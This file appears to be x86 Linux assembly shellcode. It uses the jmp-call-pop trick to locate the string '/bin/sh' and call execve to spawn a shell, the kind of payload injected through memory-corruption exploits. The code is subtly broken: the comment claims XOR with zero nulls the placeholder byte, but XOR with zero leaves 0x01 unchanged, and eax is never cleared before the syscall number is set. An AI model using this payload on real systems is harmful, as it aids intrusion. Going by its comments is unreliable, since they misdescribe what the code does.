section .text
global _start

_start:
    jmp short get_string

shellcode:
    pop ebx                ; ebx = address of "/bin/shX"
    xor ecx, ecx
    xor edx, edx

    ; Turn placeholder into NULL byte
    xor byte [ebx+7], cl   ; X ^ 0 = 0

    mov al, 0x0b           ; execve syscall
    int 0x80

get_string:
    call shellcode
    db "/bin/sh", 0x01